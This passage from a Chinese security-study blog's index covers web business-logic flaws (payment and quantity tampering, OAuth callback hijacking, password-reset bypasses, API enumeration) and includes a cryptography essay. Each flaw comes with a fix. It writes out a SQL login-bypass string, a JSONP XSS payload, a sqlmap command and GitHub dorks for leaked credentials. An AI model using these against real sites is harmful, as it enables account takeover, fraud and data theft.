相互修改权限注册两个账号，各自不能修改自己的权限，但可以修改对方的权限。A账号修改B账号的权限为管理员即可。（现实中估计很难找到这样的案例） 防范 对输入参数校验。 加密ID。 每一步都要验证用户身份。 统一权限验证是否有足够权限。 OAuth2.0OAuth是啥在先前文章有讲到。 CSRF在A界面中，可以绑定一个百度账号，那么就需要跳转到百度去授权登录绑定才行。因为绑定的百度账号显然是可以控制的，如果没有什么token验证的话，就可以使用csrf，构造出一个链接，将要绑定的百度账号修改成自己的，引诱其它用户点击，那么它们的账号就会绑定我的百度账号了。 劫持授权自己先尝试登录一个其它域的账号，如上面提到的百度账号。在当前用户界面，点击立即绑定后，发现有oauth_callback=xxx.com。这个就是在绑定之后返回刚才的用户界面。如果跟token没什么联系，就可以修改成自己的某个域。将链接发送给其它用户引诱点击，那么它们在绑定百度账号后就会跳转到我们指定的地址，同时可以在这个地址里编写一段代码获取跳转过来带的oauth_token信息。就可以利用这个自己操作对那个用户绑定任意账号。 防范 使用state参数防范csrf。 验证回调地址是否与自己的账号信息对应。 在线支付安全F12修改价格再付钱修改订单数量买两件商品，一件数量是1，一件是-1。付款就是两个计算之后的金额。 订单请求不停重复尝试0元购买价格无法修改，但是可以改运费比如价格是1500，将运费改成-1499。看看是否是付1元。 防范 每个商品对应一个价格，服务端验证商品ID。 校验提交的订单数量。 订单编号唯一，防止重放攻击。 运费不能低于0。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"最后的总结-越权访问、OAuth2.0和在线支付安全","slug":"最后的总结-越权访问、OAuth2-0和在线支付安全","permalink":"https://ggyggy666.github.io/tags/%E6%9C%80%E5%90%8E%E7%9A%84%E6%80%BB%E7%BB%93-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E3%80%81OAuth2-0%E5%92%8C%E5%9C%A8%E7%BA%BF%E6%94%AF%E4%BB%98%E5%AE%89%E5%85%A8/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"密码编码的发展和破译的发展","slug":"密码编码的发展和破译的发展","date":"2020-03-01T02:04:58.000Z","updated":"2020-03-01T02:17:15.358Z","comments":true,"path":"2020/03/01/密码编码的发展和破译的发展/","link":"","permalink":"https://ggyggy666.github.io/2020/03/01/%E5%AF%86%E7%A0%81%E7%BC%96%E7%A0%81%E7%9A%84%E5%8F%91%E5%B1%95%E5%92%8C%E7%A0%B4%E8%AF%91%E7%9A%84%E5%8F%91%E5%B1%95/","excerpt":"一开学就受到2000字暴击…","text":"一开学就受到2000字暴击… 密码编码和破译的发展摘要本文主要以一种时间顺序的方式讲述了从古代到现代的密码编码的发展，接着讲述了密码破译的发展，最后得出了密码学是在攻与防、编码与破译之中不断向前发展的结论。 关键词密码 编码 破译 发展 引言随着如今互联网的普及，大多数人都能使用网络进行通信。与此同时，信息的安全也显得尤为重要。每个人肯定不希望自己的隐私被人随意就能看到，因此需要将信息加密之后再在互联网上传递。那么，信息的加密是否能够做到足够的安全，将取决于它的加密算法是否足够优秀，是否不容易被破解。因此我们需要首先了解密码的编码算法，但这还不够。所谓有防就有攻，我们还需了解破解的一些方式，才能更好的改进。于是本文就遵循以上的原则，讲述了密码编码及其破译的发展。 内容1. 理论基础要想了解密码的编码与破译，我们得首先了解一下它的理论基础。首先是密码体制，密码体制实质就是一个五元组（P,C,K,E,D）。它们代表的含义是： P是可能明文的有限集 ： 明文空间 C是可能密文的有限集 ： 密文空间 K是可能密钥的有限集 ： 密钥空间 对于任意k ∈ K，有一个加密算法ek∈E ，使得 ek：PC，即ek(x)=y (这里 x∈P， y∈C) ，称E为 加密变换族 (Ek)  相应的解密算法 dk∈D，dk：CP，满足dk(ek(x)) = x，称D为 解密变换族 (Dk) 总的说来，一个明文需要从密钥空间中取出一些有限个数的密钥，使用加密算法进行加密，得到密文，然后将密文传输到接收方后，接收方使用密钥空间提供的密钥使用解密算法进行解密，从而得到明文。 2. 密码编码的发展2.1 古典密码古典密码总的可以归结为置换和代换两类。把明文中的字母重新排列，字母本身不变，但其位置改变了，这样编成的密码称为置换密码。最简单的置换密码是把明文中的字母顺序倒过来，然后截成固定长度的字母组作为密文。而代换密码则是将明文中的每一个字符替换成其它字符。 2.1.1 置换密码置换密码分为列置换和周期置换。列置换的加密过程为：将明文按固定长m分组，即每行m个字母，在密钥控制下按某一顺序交换列，最后按列优先的顺序依次读出，即产生了密文。周期置换的加密过程为：很大程度上同列置换，只不过加、解密时，在列交换后是按行优先的顺序向下进行。 2.1.2 代换密码代换密码可以分为单表代换和多表代换。但不管怎么说，都只不过是将明文中的每一个字符替换成其它字符罢了。单表置换有：加法、乘法、密钥词组代替。都是以某一种规律将某个字母替换成另一个字母，因为替换之后的字母可以被穷举到，而且只有一个，安全性不高，因此诞生了多表代换，即构造多个密文字母表，在密钥的控制下用以一系列代换表依次对明文消息的字母序列进行代换。多表代换有Vernam密码、Playfair密码、Hill密码。利用了矩阵，代换的字母的可能性也更多，复杂性有所提升。 2.2 近现代密码到了近现代，密码的复杂性逐步提升了，可破译的难度也越来越高了。常见的有对称密钥密码体系和非对称密钥密码体制。 2.2.1 对称密钥密码体制对称密钥密码体制又分为分组密码和流密码两大类。分组密码是一种将固定长度的二进制输入字符串变成固定长度的二进制输出字符串的算法。就相当于将全部同学平均分成几个小组那样。为我们熟知的分组密码有DES和AES。 2.2.1.1 DES算法DES算法加密时把明文以64bit为单位分成块，采用8个S盒和P置换，经过16轮迭代，最终产生64bit密文。每轮迭代使用的48bit子密钥由原始的56bit产生。DES的加密与解密的密钥和流程完全相同，只是加密与解密使用的子密钥序列的顺序相反。 2.2.1.2 AES算法AES技术是一种对称的分组加密技术，使用128位分组加密数据，提供了比WEP/TKIPS的RC4算法更高的加密强度。由于1个字节有8位，因此有16个字节。也就是说128位的输入明文分组P和输入密钥K都被分成16个字节，每个明文分组会被加密10轮。明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。值得注意的是，AES的加密码表和解密码表是分开的，并且支持子密钥加密。 2.2.2 流密码利用密钥产生一个密钥流，然后利用这个密钥流一次对明文进行加密，这样产生的密码就是序列密码，即流密码。常见的流密码有RC4，SEAL等。流密码采用的是一次一密，以一个元素作为基本单位元，随时间而变化。它可被分为同步和自同步两种。 2.3 非对称加密算法我们熟知的非对称加密算法应该就是RSA了。其原理就是利用了超大整数难以被分解这个点。它使用了公钥和私钥机制。每个用户都有公钥和私钥，而公钥顾名思义是共享出来的，所有人都能知道。私钥就是自己私有的，别人不知道。当一个用户想向另一个用户发送消息时，就会使用对方的公钥进行加密，对方收到后，就可以使用自己的私钥进行解密。这样就能保证两个人互相通信的安全可靠性。 2.4 量子密码随着现代技术的发展，出现了量子密码。与RSA依靠大整数难以被分解不同，量子密码主要依赖于物理问题难以被解决。它是一种以现代密码学秘量子力学为基础、利用量子物理举方法实现密码思想和操作的新型密码体制。它具有2个基本特征：对俗道中窃听行为的可检测性和方案的高安全性(可证明安全性和无条件安全性)。到目前为止， 主要有三大类密码实现方寨：一是基于单光子量子信道中测不准原理的；二是基于量子相关信道中Bell原理的：三是基于2个非正交量子态性质的。在计算上更加复杂了。 3. 密码破译的发展任何密码算法都不是足够安全的，都有其漏洞，都是可被破解的。在我们目前看来不可破解的一些加密算法，其实只是因为技术上尚未达到才导致不可破解，但理论上都是可行的，要想破解，只是时间问题罢了。对于古典密码来说，通常只是字母之间的置换或代换，而字母毕竟只有26个，即使乘上明文的长度，以目前的算力还是可以直接使用穷举法暴力破解的，而对于对称加密算法中的分组密码，它有四种模式，分别是ECB、CBC、CFB、OFB模式。它们本身就存在着缺陷，因此生来就是不安全的。比如ECB使用同一个密钥简单地将每个明文块一个接一个地进行加密；CBC模式对包含某些错误比特的密文进行解密时，第一个分组的全部比特以及后一个分组的相应比特会出错；加密不支持并行计算；无法抵御重放攻击。而流密码的序列由于是伪随机的并不能做到真正的随机，因此也是可被破译的。对于非对称加密算法的RSA来说，如果终有一天人类能达到一个非常大的算力时，届时RSA所依赖的大整数不能被分解的原理将会被打破，导致经过RSA加密的明文可直接被破译出来。对于现代的量子密码等来说也是一样，都只是依赖于目前的技术无法攻克的一些难题。如果日后这些难题都不再是难题，这些加密算法还会安全吗？ 总结不管怎么说，时代在进步，技术在发展。破译的一方面对着加密算法的新挑战也会不断学习，想出破译办法；加密的一方面对着破译者的威胁也会不断努力，改善加密算法。世界就是如此的奇妙，互相敌对的两方同时也在互相的激励。在这样不断的对抗中，我相信我们的技术将会逐渐逐渐的发展起来，最终变的足够强大。 参考文献：[1]吕兴凤、姜誉的计算机密码学中的加密技术研究进展[2]秦志光的密码算法的现状和发展研究[3]百度百科","categories":[{"name":"密码学","slug":"密码学","permalink":"https://ggyggy666.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"密码编码的发展和破译的发展","slug":"密码编码的发展和破译的发展","permalink":"https://ggyggy666.github.io/tags/%E5%AF%86%E7%A0%81%E7%BC%96%E7%A0%81%E7%9A%84%E5%8F%91%E5%B1%95%E5%92%8C%E7%A0%B4%E8%AF%91%E7%9A%84%E5%8F%91%E5%B1%95/"}],"keywords":[{"name":"密码学","slug":"密码学","permalink":"https://ggyggy666.github.io/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}]},{"title":"密码找回安全案例总结","slug":"密码找回安全案例总结","date":"2020-02-29T11:21:38.000Z","updated":"2020-03-01T11:35:29.056Z","comments":true,"path":"2020/02/29/密码找回安全案例总结/","link":"","permalink":"https://ggyggy666.github.io/2020/02/29/%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E5%AE%89%E5%85%A8%E6%A1%88%E4%BE%8B%E6%80%BB%E7%BB%93/","excerpt":"今天开始进入–密码找回安全案例。","text":"今天开始进入–密码找回安全案例。 密码找回是一个重要的业务，它的安全性也很重要。 验证码可被暴力破解密码找回凭证直接返回在客户端 直接暴露在URL中F12-&gt;查看请求链接 加密验证字符串返回给客户端发送邮箱验证码后，查看返回的数据包，发现包含有加密字符串。在邮箱中得到验证码后，输入，进入重置密码界面，可以发现链接中的验证码被加密后跟刚才发现的加密字符串是一样的。因此可以不用得到验证码，直接在URL加上客户端返回的加密字符串即可。 网页源代码的hidden属性的标签中隐藏有密保答案 短信验证码返回给客户端密码重置链接存在弱token 利用服务器时间作为token。使用两个账号，几乎同时发生邮箱，对比其中差异，判断是服务器时间作为token。 使用系统时间将token值MD5解密，得到一串长的数字，可能就是UNIX时间戳格式，可以用UNIX时间戳转换工具转换。使用短信验证码找回填入收到的验证码后提交，抓包修改username。token未与ID绑定，修改发送到邮箱的用户ID重新绑定用户手机注册账号，进入一个绑定手机号的页面，输入自己的手机号，提交抓包，修改uid或者用户名等成其它用户。这样其它用户可能就会绑定了我自己的手机。找回密码时就可输入那个用户的信息，发送验证码到我手机。重新绑定用户邮箱登录后，可以查看其它用户的信息（跳转到对应用户的信息界面）。如果该页面提供了绑定邮箱的功能，就可以尝试绑定自己的邮箱。服务端逻辑验证缺陷抓包，删除相应的参数。邮箱地址可被抓包修改身份验证页面直接输入最后重置密码页面的链接进行跳过抓包修改返回包的状态码注册覆盖注册时，输入一个用户名，显示已被注册。输入一个没被注册的用户名，抓包，修改成之前被注册的那个用户名。Session覆盖前面讲过了。一个账号发送了邮箱验证后，先不要点击邮箱中的链接。同一浏览器下开一个新标签，登录另一个账号，同样发送邮箱验证，然后点击之前第一个账号收到的邮箱链接，就能使第二个账号直接进入重置密码界面。 防范 对验证码次数和失效时间进行限制。 密码找回各个流程严格控制好，防止直接跳转步骤。 Token不能太弱。 密码重置凭证应与账号的信息严格绑定。 对客户端传入的数据进行校验。 防止重复注册，注册覆盖。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"密码找回安全案例总结","slug":"密码找回安全案例总结","permalink":"https://ggyggy666.github.io/tags/%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E5%AE%89%E5%85%A8%E6%A1%88%E4%BE%8B%E6%80%BB%E7%BB%93/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"账号安全案例总结","slug":"账号安全案例总结","date":"2020-02-28T11:58:58.000Z","updated":"2020-03-01T03:27:30.286Z","comments":true,"path":"2020/02/28/账号安全案例总结/","link":"","permalink":"https://ggyggy666.github.io/2020/02/28/%E8%B4%A6%E5%8F%B7%E5%AE%89%E5%85%A8%E6%A1%88%E4%BE%8B%E6%80%BB%E7%BB%93/","excerpt":"相关业务漏洞点已经讲完啦。进入某个特定点的总结。","text":"相关业务漏洞点已经讲完啦。进入某个特定点的总结。 今天开始账号安全案例总结。 如今很多网站都是通过账号密码登录来验证用户的身份并给予相应的权限，与此同时账号安全问题也日益严重。相关的漏洞如下： 密码泄露 暴力破解 弱口令 密码重置 登录账户绕过 重放攻击 网络钓鱼 信息泄露 中间人攻击 相关案例 账号密码直接暴露在互联网上 通过谷歌语法搜索存储在GitHub上的敏感信息。比如：邮件配置信息查询：site:Github.com smtp password数据库信息泄露：site:Github.com sa passwordsvn信息泄露：site:Github.com svn数据库备份文件：site:Github.com inurl:sql 例： site:Github.com password 在GitHub上找到某个企业网站的数据库配置信息。在GitHub上可能会在配置文件的url中显示出来链接数据库的地址，也可能同时存在数据库登录的账号密码。另外可能在某一个文件中存在一串经过base64加密的字符串，需要重点关注。 无限制登录任意账号 使用万能密码：admin&#39; or 1=1。 劫持任意账号：查看到已经注册的用户，F12看看能否查看到他们的uid。然后自己登录时抓包替换uid，看是否能登录他们的账号。 电子邮件账号泄露filetype:xls site:xxx.com查找某个网站的xls文件，下载，从中获取信息。 中间人攻击 SSL证书欺骗：在劫持了用户和服务端的会话后，将HTTP页面里所有的HTTPS链接都换成HTTP。（我不知道如何具体实现劫持会话，转换） 撞库攻击：在子站中爆破出来的账号密码能用于同一域名下的其它网站。 防范 加密敏感数据，禁止外部链接数据库。 采用HTTPS对认证过程进行封装。 员工安全意识加强。 使用数字证书认证。数字证书：通过运用对称和非对称密码体制等密码技术建立起一个严密的身份认证系统。 其它就靠安全防护能力了。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"账号安全案例总结","slug":"账号安全案例总结","permalink":"https://ggyggy666.github.io/tags/%E8%B4%A6%E5%8F%B7%E5%AE%89%E5%85%A8%E6%A1%88%E4%BE%8B%E6%80%BB%E7%BB%93/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"Web业务-业务接口调用模块","slug":"Web业务-业务接口调用模块","date":"2020-02-28T01:04:16.000Z","updated":"2020-03-01T03:17:57.176Z","comments":true,"path":"2020/02/28/Web业务-业务接口调用模块/","link":"","permalink":"https://ggyggy666.github.io/2020/02/28/Web%E4%B8%9A%E5%8A%A1-%E4%B8%9A%E5%8A%A1%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E6%A8%A1%E5%9D%97/","excerpt":"两天没更新了，在忙着学css并且做了个静态的小网页。链接在这然鹅粗略地看了一遍CSS后又忘完了…就这么点东西就花了我一天的空闲时间，唉,写网页也太难了吧。","text":"两天没更新了，在忙着学css并且做了个静态的小网页。链接在这然鹅粗略地看了一遍CSS后又忘完了…就这么点东西就花了我一天的空闲时间，唉,写网页也太难了吧。 昨天晚上看了一章–业务接口调用模块，因为急着想看番，就留到现在写了。 接口调用重放 原理： 在某些业务中，没有对某一次的操作进行限制，导致经过多次重放仍能生成有效的结果。 方法： 购买机票，提交订单同时抓包，发送到repeater中，点击几次go，发现提交了几次订单。 修复： 采用验证码，采用token，且每一次唯一。 接口调用遍历 原理： Web接口通过传入的不同参数（如id）获取不同的信息，可以通过遍历，观察是否返回不同用户的信息。 方法： 登录一个网站后，在网站根目录中开启burp代理，刷新，在burp的http history中找到根网址，右键点击（scan或者spider)爬取网站，在target的Site map中查看爬取结果，可以使用burp的filter功能过滤掉一些。比如在filter的“by serch term”输入uid,就可以只显示带有uid的URL。查看这个URL的请求，发送到repeater中，go一下看是否返回什么信息，然后再换一个uid看是否返回了不同的信息。如果是，接着发送到intrude中，payload选择number，爆破即可。 修复： 在Session中存储id或当前用户的凭证，传入参数时校验。 接口调用参数篡改 原理： 在短信、邮箱服务中，修改手机号或邮箱，看是否将验证码发送到了修改后的手机上。 方法： 在不是自己的账号的找回密码中，点击发送验证码，抓包，修改成自己的手机号，发包，观察自己是否收到验证码。 修复： Session中存储用户的凭证，应从session中获取而不是从客户端的请求参数获取，获取后还要再次校验。 接口未授权访问/调用 原理： 没有对用户的身份进行校验，导致不登录也能访问。 方法： 同样使用burp的爬取网站功能将网站爬下来，在filter中筛选出含script、xml、json、text、MIME type类型的，将hide js、gif等还有hide terms without response勾选上。之后点击筛选后的URL，观察是否返回敏感信息。然后将URL复制到另一个没登录的浏览器中访问。 修复： 添加token验证，后端对会话状态进行验证是否登录。 Callback自定义 原理： 同源策略：协议、域名、端口都相同。 Ajax使用异步传输解决非同源的限制时，使用了JSONP，即用script标签的src远程调用json文件。这个过程中，JSONP技术使用了callback参数声明所使用的函数名。如果没有限制或校验这个函数名，很可能造成xss等漏洞。 方法： 同样对网站爬取。筛选出带有callback或jsonp的参数请求。在filter中的”search term”输入callback（或jsonp）,勾选”hide js gif”,单击上面那行filter:Hiding….生效。找到带callback的请求后，点击查看响应，看Content-Type类型是否为text/html，如果是，发送到repeater，在callback的参数值增加&lt;h1&gt;，即callback=&lt;h1&gt;jsonp1&lt;/h1&gt;，go一下看是否返回了我们的输入。如果是可以修改为：callback=&lt;img onerror=alert(1) src=x&gt;jsonp1. 修复： 定义Content-Type类型为json，建立callback函数的白名单，对&lt;&gt;等标签过滤。 WebService 原理： WebService是一种远程调用技术，实质就是一个程序向外界暴露出了一个可通过Web调用的API，传入的参数不限制就有可能导致SQL注入等。它包括：XML+XSD、SOAP、WSDL。 XML+XSD：描述、表达要传输的数据。 SOAP：交换XML编码信息的轻量级协议，以XML或XSD为载体，通过HTTP发送请求和接受结果。会在HTTP基础上增加特定消息头。 WSDL：一个基于XML的描述Web Service及函数、参数和返回值的语言。 方法： 通过爬虫或者目录扫描等找到WebServices的链接，如xxx.com/Service/ComService.svc。然后在后面加上?wsdl，在浏览器中访问，返回的是一个xml文件。使用AWVS，点击左侧的“Web Service Editor”，在输入框输入带有?wsdl的那个链接，点击import。然后在operation选项中，可以选择一些WebService定义的函数，选择一个，就能显示需要输入的参数值。比如以Get开头的函数名，从数据库返回一些信息；以Exec开头的直接执行SQL语句或特定指令。选择ExecNonQuery函数，可执行非查询语句的接口。接收到了一个名为sql的参数。在soap-env:body的内容中，可以看到&lt;sql&gt;1&lt;/sql&gt;。点击HTTP Editor，在Request中点击Text Only，然后在sql中，编辑：&lt;sql&gt;1&#39;&lt;/sql&gt;。点击start发送。查看响应内容看是否报错。根据报错知道数据库类型，之后就可以试着使用SQL语句查询。应该使用延时注入。判断存在漏洞后，然后可以用burp将WebService的请求抓取下来，使用sqlmap注入。参数是-r。即：python sqlmap.py -r text.txt。 修复： 添加身份认证。 对接收的参数在后端进行过滤。 在敏感功能的函数中，添加密码认证。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web业务-业务接口调用模块","slug":"Web业务-业务接口调用模块","permalink":"https://ggyggy666.github.io/tags/Web%E4%B8%9A%E5%8A%A1-%E4%B8%9A%E5%8A%A1%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E6%A8%A1%E5%9D%97/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"Web业务-密码找回模块测试","slug":"Web业务-密码找回模块测试","date":"2020-02-25T13:31:02.000Z","updated":"2020-03-01T03:18:19.518Z","comments":true,"path":"2020/02/25/Web业务-密码找回模块测试/","link":"","permalink":"https://ggyggy666.github.io/2020/02/25/Web%E4%B8%9A%E5%8A%A1-%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%A8%A1%E5%9D%97%E6%B5%8B%E8%AF%95/","excerpt":"今天晚上有课，所以更新迟了些。","text":"今天晚上有课，所以更新迟了些。 今天学习了密码找回模块这一章。 验证码客户端回显 原理： 验证码回显在服务端的响应包中。 方法： 在找回密码中，填写信息，发送验证码，burp抓包，查看响应包，观察是否回显了验证码。 修复： 验证码不能放到响应包中，应在服务端进行校验。 验证码暴力破解 原理： 验证码失效时间较长，只有4位数字这样短且复杂性弱，没有对验证失败次数做限制。 方法： 发送验证码后，随便填写，抓包，发送到intrude中，使用1000到9999爆破。 修复： 提高验证码复杂度，对验证失败次数做限制，验证码存活时间缩短。 接口参数账号修改 原理： 找回密码功能会在用户修改密码接口提交参数时传递用户的参数，如果该参数可控且没有什么验证，就能修改这个参数。将验证码等发送到攻击者手上。 方法： 输入一个不是自己的账号（比如admin）后，发送重置密码的邮件或者手机验证码，抓包，将邮箱或者手机号修改为自己的，观察是否能收到信息。如果可以就能修改掉admin的密码了。 修复： 在服务端对找回密码的账号与邮箱或者手机号亦或者token进行验证。 response状态值修改 原理： 服务端返回包出现明显的校验成功或者失败的关键字（比如状态码0和1、false和true等），而且校验是在客户端进行校验返回包的关键字。那么就可以被修改。 方法： 发送验证码后，随便填写一个验证码，点击提交同时抓包，查看返回包，修改false-&gt;true，发包即可绕过。 修复： 不要在前端利用服务端返回的值判断。应在服务端进行校验。 Session覆盖 原理： 有两个账号，一个已经成功进入重置密码界面，另一个还未发送验证码，它们处在同一浏览器的不同标签下，那么可以刷新成功的那个，此时浏览器的Session会将未发送的那个账号的Session覆盖掉，从而使未发送的那个账号也成功进入重置密码界面。 方法： A账号：需要用户自己的真实信息。填写信息，发送验证码，填入后成功进入到了重置密码界面。 打开一个新标签，也进入找回密码界面。填入B账号信息，到发送验证码这步时，发送后，因为不是自己的手机号，所以收不到。切换到A账号这个标签中，刷新一下，看是不是显示的是B账号信息而且此时进入了重置密码界面。如果是，那么就可以进行任意账号密码重置了。 修复： 要对修改的账号和Session凭证进行校验。 弱Token设计缺陷 原理： 找回密码时，向邮箱发送一个邮件，需要点击邮件中的一个链接就可以认证成功了。如果这个链接的认证参数如Token可被解码猜解，那么可以被构造出这个链接点击就能认证成功了。 方法： 填写账号信息，向邮箱发送邮件，多点击几次。邮箱就能收到几个邮件。观察这几个邮件中的URL看是否有什么不同。查看到只有Token不同，而且Token使用了base64编码，解码后比较，发送只有几个数字不同，那么可以抓包，发送到intrude中，使用数字而且加密成base64后进行爆破，爆破出来点击那个链接即可。也可能是使用了时间戳作为Token，那么可以转化为系统时间。在点击发送邮件那时，记录下此时系统的时间，转化为时间戳即可构造出来。 修复： 应使用复制的TOken。 密码找回流程绕过 原理： 找回密码分几步走，而且每一步的链接直接显示出来，直接访问也可以访问到。 方法： 先使用自己的账号注册后，点击找回密码，安按照流程走一遍修改密码，将每一步的URL记录下来。 重新进入重置密码界面，在第一步输入某个账号信息（如admin），然后点击下一步进入发送验证码这个界面，在URL中直接修改成验证了验证码后的最后一步的URL，看是否能直接跳转到最后一步。这样就能绕过验证身份这一步。当然或许也可以通过抓包修改返回包绕过。 修复： 一定要在后端验证每一步。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web业务-密码找回模块测试","slug":"Web业务-密码找回模块测试","permalink":"https://ggyggy666.github.io/tags/Web%E4%B8%9A%E5%8A%A1-%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%A8%A1%E5%9D%97%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"Web业务-业务数据安全和业务处理乱序模块测试","slug":"Web业务-业务数据安全和业务处理乱序模块","date":"2020-02-24T11:55:34.000Z","updated":"2020-03-01T03:17:51.853Z","comments":true,"path":"2020/02/24/Web业务-业务数据安全和业务处理乱序模块/","link":"","permalink":"https://ggyggy666.github.io/2020/02/24/Web%E4%B8%9A%E5%8A%A1-%E4%B8%9A%E5%8A%A1%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%92%8C%E4%B8%9A%E5%8A%A1%E5%A4%84%E7%90%86%E4%B9%B1%E5%BA%8F%E6%A8%A1%E5%9D%97/","excerpt":"今天是上课的第一天，趁着晚上没有课，又学习了两个模块-业务数据安全模块和业务处理乱序模块。","text":"今天是上课的第一天，趁着晚上没有课，又学习了两个模块-业务数据安全模块和业务处理乱序模块。 由于业务处理乱序模块内容少，就合在一块总结了。 业务数据安全商品支付金额篡改 原理： 没有对用户提交的业务数据进行验证，没有对订单的金额进行校验。 方法： 购买商品生成订单后，点击支付，抓包，修改商品金额，发包。 修复： 不能接受从客户端传递过来的金额值，应该在服务器端校验。 商品订购数量篡改 原理： 对订购中的商品数量、价格没有校验。 方法： 使用积分兑换商品时，准备生成订单提交同时抓包，修改商品的数量为负数，使得相应支付的积分也变为负数，发包，支付成功后观察是否实际支付的积分也是负数。 修复： 服务端探测到商品数量、金额等异常时，应立即中断交易。 前端JS绕过 原理： 限制用户购买的数量时，仅仅在前端进行JS限制。 方法： 在源码中查看是否有限制购买的数量的参数，修改即可。 抓包，修改限制的购买数量值，发包。 修复： 对商品金额、折扣、数量等都应该交由服务端处理校验。 请求重复 原理： 在用户购买一次后，没有对相应验证的token等进行失效处理。 方法： 生成订单时抓包，观察每次订购相同商品时是否存在验证的随机Token、可变参数等。如果有，检测它们是不是只在本次订购时有效，在下一次订购时又变化了。如果Token等都没有变，那么就可以生成订单支付后，抓包，发送到repeater中，一直go。观察是否购买了多个商品。 修复： 每次订单生成的Token不能重复提交。服务端应该对订单Token中的订购信息进行验证。 业务上限 原理： 用户本来只能查询到一定范围内的信息，但通过抓包修改后，可能可以查询到超出预期的信息。 方法： 在查询记录中，本来只能查询6个月信息，抓包，修改成6个月以上，发包后如果返回超过6个月的信息，就表明服务端没有限制用户的查询。可以联想到类似例子：普通用户只能看不是VIP的视频，修改某个VIP特定标识后就可以观看VIP视频了。 修复： 服务端都应对用户提交的信息进行验证。 业务流程乱序业务流程绕过 原理： 本来是正常的流程，在进行到某一步后，可以直接修改信息跳过了前面的步骤。 方法： 注册流程中： 第一步，填写注册信息，发送验证码。 第二步，填写收到的验证码。 第三步，注册成功。 在第三步时，抓包，修改手机号码，如果成功注册，那么对于这个新的手机号码来说，就绕过了前面两步。 先购买一个商品，到最后的一步时，查看链接是否可以通过修改商品单号就能成功购买。然后记录下这个链接。再次购买一个商品，生成订单之后，支付的时候抓包，将商品单号记录下来。再将之前记录的链接：http://xxx.com/xxx.php?xxx=商品订单号，将订单后替换进去，访问，观察是否支付成功。美中不足的是，它需要先购买一个商品才能看到最终支付成功的链接。如果源码有什么信息的话，也可以不用购买，自己构造出一个成功的链接。当然，这比较困难。 修复： 对敏感信息如身份ID、商品订单号、金额等进行加密。还应对订单号对应的商品、金额等进行校验。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web业务-业务数据安全和业务处理乱序模块测试","slug":"Web业务-业务数据安全和业务处理乱序模块测试","permalink":"https://ggyggy666.github.io/tags/Web%E4%B8%9A%E5%8A%A1-%E4%B8%9A%E5%8A%A1%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%92%8C%E4%B8%9A%E5%8A%A1%E5%A4%84%E7%90%86%E4%B9%B1%E5%BA%8F%E6%A8%A1%E5%9D%97%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"Web业务-验证码机制测试","slug":"Web业务-验证码机制测试","date":"2020-02-23T11:29:22.000Z","updated":"2020-03-01T03:18:07.477Z","comments":true,"path":"2020/02/23/Web业务-验证码机制测试/","link":"","permalink":"https://ggyggy666.github.io/2020/02/23/Web%E4%B8%9A%E5%8A%A1-%E9%AA%8C%E8%AF%81%E7%A0%81%E6%9C%BA%E5%88%B6%E6%B5%8B%E8%AF%95/","excerpt":"明天就要上课了，抓紧时间玩吧。","text":"明天就要上课了，抓紧时间玩吧。 今天有点懒，就只看了一章–验证码机制，不过还是学到了一种新姿势哈。 验证码暴力破解 原理： 短信验证码基本是4-6位数字，如果没有对验证码失效时间以及尝试失败的次数进行限制，那么可以被暴力破解。 方法： 发送验证码后，先随便输入一个验证码，然后提交抓包，转到burp的intrude模块，利用payload中的number，根据验证码的位数设置范围（如：4位：设定1000-9999），进行爆破即可。 修复： 设置验证码失效时间。 限制一定时间内达到失败次数就禁止尝试。 验证码重复使用 原理： 验证码验证成功后没有及时清空session，导致验证码可被重复使用。 方法： 填入内容，输入验证码，提交同时抓包，发送到repeater中，点击几次go都能正常响应。 修复： 服务端在第一次验证成功后，将验证码的session清空。 验证码客户端回显 原理： 验证码在客户端生成并且直接显示在返回包中。 方法： 发送验证码后，按F12-&gt;Network-&gt;response。看看是否显示有验证码。注意，不是burp的返回包数据。因为在network中查看到的可以是客户端生成最终返回到客户端的数据，而burp的返回包只能是从服务端返回的数据。（比如下一个类型的例子） 修复： 